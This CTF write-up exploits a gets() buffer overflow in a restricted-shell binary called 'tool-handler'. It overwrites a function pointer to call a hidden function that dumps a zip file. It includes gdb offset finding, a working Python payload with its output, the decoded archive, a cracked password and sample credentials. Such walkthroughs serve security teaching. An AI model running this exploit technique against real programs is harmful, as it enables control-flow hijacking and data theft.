
# Vulnerability
----
This challenge happens in the `tool-handler` binary file.

We see, in the source code, that the program is a kind of shell that allows the user to execute only a limited set of predefined programs by matching the input against a whitelist of valid commands. However, the use of `gets()` introduces a critical vulnerability since it does not perform any bounds checking on the input buffer. Because the buffer `cool_prog` is stored just before the function pointer `cb` inside the `locals` structure, supplying an input longer than 234 bytes allows us to overflow the buffer and overwrite the callback pointer. This gives us control over the function that will be executed by `locals.cb()`, making it possible to redirect execution to hidden functions such as `back2back()`, which is present in the binary but intentionally unreachable through normal program flow.

```C
struct {
	char cool_prog[234];
	void (*cb)();
} locals = {
	  .cool_prog = {0},
	  .cb = &not_found
};
```

Knowing that we could use this vulnerability to call the hidden function `back2back`, we cannot simply set `cb` to the string `"back2back"` because `cb` is a function pointer. We need the actual memory address of the `back2back()` function in order to overwrite the pointer correctly.

To retrieve this address, there are many traditional methods such as using `gdb`, `nm`, or `objdump`. However, in this case, the binary is protected and we do not have access to these tools on the target machine.

Fortunately, the source code gives us an important hint with the following comment:
`// gcc tool-handler.c -fno-pie -no-pie`

This means that the program was compiled without PIE (Position Independent Executable). As a result, the binary is loaded at a fixed address in memory each time it is executed, and the address of `back2back()` remains constant across runs.

This is extremely useful for exploitation because it allows us to determine the function address locally and reuse it reliably on the remote target.

First : I create a main.c file that contains the source code of the tool-handler, and I compile it with the following command: `gcc main.c -fno-pie -no-pie`
Now I can try to read some information from my own binary `./a.out` using `gdb`

```bash
gdb ./a.out
(gdb) break main
(gdb) run (gdb) next # skip valid[] initialization
(gdb) next # skip locals initialization
(gdb) p &locals.cool_prog $1 = 0x7fffffffe250
(gdb) p &locals.cb $2 = 0x7fffffffe340
```

The offset is `0x7fffffffe340 - 0x7fffffffe250 = 0xF0 = 240 bytes`. This means we need exactly 240 bytes of padding to reach the function pointer `cb`.
Finding the address of `back2back` :

```bash
readelf -s ./a.out | grep back2back 
# 48: 00000000004011a6 FUNC GLOBAL back2back
```

Since the binary is compiled without PIE, this address `0x4011a6` is identical on the remote target.

Second part : Build the payload
```bash
python3 -c "
import sys
payload = b'X' * 240 + b'\xa6\x11\x40\x00\x00\x00\x00\x00'
sys.stdout.buffer.write(payload + b'\n')
" | ./tool-handler
```

```bash
intern@ecorp:/mnt/dev$ ls
srcs.zip  tool-handler
intern@ecorp:/mnt/dev$ python3 -c "
import sys
payload = b'X' * 240 + b'\xa6\x11\x40\x00\x00\x00\x00\x00'
sys.stdout.buffer.write(payload + b'\n')
" | ./tool-handler
_.-~* ECorp super duper caller mkIII (copyright junior-dev) *~-._
$[Enter program] > UEsDBBQACQAIAOGBfFzdsoClVgQAAPwHAAANABwAc2VjcmV0LW1hbnVhbFVUCQADdfDHaXXwx2l1
eAsAAQToAwAABOgDAAA9d2VbyOvPIob+SBnL1WhlxwI220IE8omOqJzJNfUEB0lRYtqtwgfnTP+B
PAMhjs3nfoNJw3LJ7n+KDZ8vLSzK0CQczrNRWmd+9SR3cpgvC1ZRwC5UUNXkjmFQL4iNDkdzyU1j
t/Ma5ZBb0GXInj988kSM1dJwbfb02dSWVMdJyTBO7FpW8kvlucyAfqPv3fyrzJKmTdJc2FGhgXWz
1yBh65w+eZUKMixzbjBs97Drpj1cyKLg/AkOZFf0YuAvFcSe9J/1v7ZYy5FaIj/CtU1qzMi0kU56
GukWCeXrpP78W97aYqisSk88M9YNxEHDrFy/kBY4yoG2Ms602fu7dLg899IcUpCltLoW21lo99dB
A8wBsA8fxNTazVr9f6j0NuZjOCdatjezxlpvodR+TpcON9jmNtQ4f0pKIwmt6kY0yXpEg37uYrB+
TpQaIBH8nadsrFi2SNvlYgaEhWhKSG1i/KFTWRgMZB1WBc1QRePb0TPqutT7Mu7PBqP3Y/DG0g7T
ciT+vpDYrPPo32bQuFmIw0wLSZ3tMQ/v+nIukBOc5HndGFJYMpAzn/Ofcb9iE5wXbF5QKQ2DKZT5
GenaNBpGbnclzpb5Ln8wDQFqtP6pS+lPHeeJrQgGdgHjI+8y3peBGBITQiMQ7FbC29l7insna8Fa
KT6pV1a6Wuk3KF8+TbNBfqB6zLpT+i1tcj/PDK0BlAvZgbxo0hCRRTRnuOIx8n4ykkrJ6JM5xJOG
wvPL5sqPBgihAhSUtEU3bdA/W+0g5824eMF89AmUiZsBbBlvq2rYBTCgm4PGmqTrzcwDq9i6o/kZ
muMQgdSrZhNpAm70wzd9FPhvDvY0V+m6uaAzK0+70DdZQT58qq21g3872XHdWwjbyRtUUyXfeInA
4NlDRuYomGq6omWLUNQgXqFvE1MiBiXg9BUHy/AGwInY1/oBO18ukD4Kgu4UyLbJjcfsxl9pwAKj
T4cNyG1OLODFzz3h5EFqDH8kldhek6lQAOaGz320uqFY8T5ORCWDKDe0TN97r6NdKGAleK6dLbHW
Xn2YGPZkp71Os7W9pzDwuk+MFDrv9D7CkN5a1GSwQEfkX06fnDderw+X3OFdi+ujU4TBmN9j23kL
XD8LOCos7HQ6zDt1yH+6u2ZWmz/gEBWpD41kBJwU+mUnbKZZg0+qJGQz5S60K/FR/YWlbtPAjGCi
URL8WcFQU4E/FwQLWzl/Ni9QxjNr+rqYUxYSZPmM/XKtes3BcXO1tUwxTaBrltwcawtw2R2//f1H
NKwRKBsVMVM3irdLJWuCoI3sKTTmrdcEL/NIGPYKaHELTo3Uykz2vz5edNq7R9o0djFOs34x8SMt
ugvVUl7VcZ058OxhzztZmD8U62qWpRZ/TAnE6At6YQzJMkljgkd2cD3gr0N1NEIRdig7MaoCp0mP
T6+jj1ZLcc14CEcbMfqALVMUpwhA6axH7ADW7N6z+ROo301BDOe3cz5QSwcI3bKApVYEAAD8BwAA
UEsBAh4DFAAJAAgA4YF8XN2ygKVWBAAA/AcAAA0AGAAAAAAAAQAAALSBAAAAAHNlY3JldC1tYW51
YWxVVAUAA3Xwx2l1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBTAAAArQQAAAAA
$[Enter program] > Program not found...
$[Enter program] > Program not found...
$[Enter program] > Program not found...
$[Enter program] > Program not found^C
```


In this output we can see the content of the /mnt/dev/srcs.zip file, but his content in base64. 

```C
void back2back() {
	system("cat /mnt/dev/srcs.zip | base64");
}
```

So extract the content of the zip file, we just need to do this to reconstitute the original zip file :


```bash
intern@ecorp:~$ echo "UEsDBBQACQAIAOGBfFzdsoClVgQAAPwHAAANABwAc2VjcmV0LW1hbnVhbFVUCQADdfDHaXXwx2l1
eAsAAQToAwAABOgDAAA9d2VbyOvPIob+SBnL1WhlxwI220IE8omOqJzJNfUEB0lRYtqtwgfnTP+B
PAMhjs3nfoNJw3LJ7n+KDZ8vLSzK0CQczrNRWmd+9SR3cpgvC1ZRwC5UUNXkjmFQL4iNDkdzyU1j
t/Ma5ZBb0GXInj988kSM1dJwbfb02dSWVMdJyTBO7FpW8kvlucyAfqPv3fyrzJKmTdJc2FGhgXWz
1yBh65w+eZUKMixzbjBs97Drpj1cyKLg/AkOZFf0YuAvFcSe9J/1v7ZYy5FaIj/CtU1qzMi0kU56
GukWCeXrpP78W97aYqisSk88M9YNxEHDrFy/kBY4yoG2Ms602fu7dLg899IcUpCltLoW21lo99dB
A8wBsA8fxNTazVr9f6j0NuZjOCdatjezxlpvodR+TpcON9jmNtQ4f0pKIwmt6kY0yXpEg37uYrB+
TpQaIBH8nadsrFi2SNvlYgaEhWhKSG1i/KFTWRgMZB1WBc1QRePb0TPqutT7Mu7PBqP3Y/DG0g7T
ciT+vpDYrPPo32bQuFmIw0wLSZ3tMQ/v+nIukBOc5HndGFJYMpAzn/Ofcb9iE5wXbF5QKQ2DKZT5
GenaNBpGbnclzpb5Ln8wDQFqtP6pS+lPHeeJrQgGdgHjI+8y3peBGBITQiMQ7FbC29l7insna8Fa
KT6pV1a6Wuk3KF8+TbNBfqB6zLpT+i1tcj/PDK0BlAvZgbxo0hCRRTRnuOIx8n4ykkrJ6JM5xJOG
wvPL5sqPBgihAhSUtEU3bdA/W+0g5824eMF89AmUiZsBbBlvq2rYBTCgm4PGmqTrzcwDq9i6o/kZ
muMQgdSrZhNpAm70wzd9FPhvDvY0V+m6uaAzK0+70DdZQT58qq21g3872XHdWwjbyRtUUyXfeInA
4NlDRuYomGq6omWLUNQgXqFvE1MiBiXg9BUHy/AGwInY1/oBO18ukD4Kgu4UyLbJjcfsxl9pwAKj
T4cNyG1OLODFzz3h5EFqDH8kldhek6lQAOaGz320uqFY8T5ORCWDKDe0TN97r6NdKGAleK6dLbHW
Xn2YGPZkp71Os7W9pzDwuk+MFDrv9D7CkN5a1GSwQEfkX06fnDderw+X3OFdi+ujU4TBmN9j23kL
XD8LOCos7HQ6zDt1yH+6u2ZWmz/gEBWpD41kBJwU+mUnbKZZg0+qJGQz5S60K/FR/YWlbtPAjGCi
URL8WcFQU4E/FwQLWzl/Ni9QxjNr+rqYUxYSZPmM/XKtes3BcXO1tUwxTaBrltwcawtw2R2//f1H
NKwRKBsVMVM3irdLJWuCoI3sKTTmrdcEL/NIGPYKaHELTo3Uykz2vz5edNq7R9o0djFOs34x8SMt
ugvVUl7VcZ058OxhzztZmD8U62qWpRZ/TAnE6At6YQzJMkljgkd2cD3gr0N1NEIRdig7MaoCp0mP
T6+jj1ZLcc14CEcbMfqALVMUpwhA6axH7ADW7N6z+ROo301BDOe3cz5QSwcI3bKApVYEAAD8BwAA
UEsBAh4DFAAJAAgA4YF8XN2ygKVWBAAA/AcAAA0AGAAAAAAAAQAAALSBAAAAAHNlY3JldC1tYW51
YWxVVAUAA3Xwx2l1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBTAAAArQQAAAAA"
| base64 -d > save.zip
```

```bash
intern@ecorp:~$ unzip save.zip 
Archive:  save.zip
[save.zip] secret-manual password:
```

As we can see, when we try to unzip the content of the save.zip file, program needs password to let us accessed to the data.
Third step: found the password, here go back to the `Envir0n` challenge and use the POC on different HASH in the forgot-password source code. The correct on is the `60d3445af1ae382994cec66b619bd2d8`, it give us the following password `Th1s_is_one_hell_of_a_P4ssw0rd` that allows us to unzip the save.zip file.

We obtains a secret-manual file that contains this :
```bash
Environment variables:
TOKEN = "EPI{1_H0P3_Y0uLL_g1v3_m3_4_C4Ll84ck}"
USER = "junior-dev"
PASS = "1337_PAzZW0rd"

Source code:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *gets(char *s);

void read sshO {
	printf("Congrats, here is your public key: \n");
	system("cat /home/junior-dev/.ssh/id_rsa.pub");
	exit(EXIT_SUCCESS);
}
```

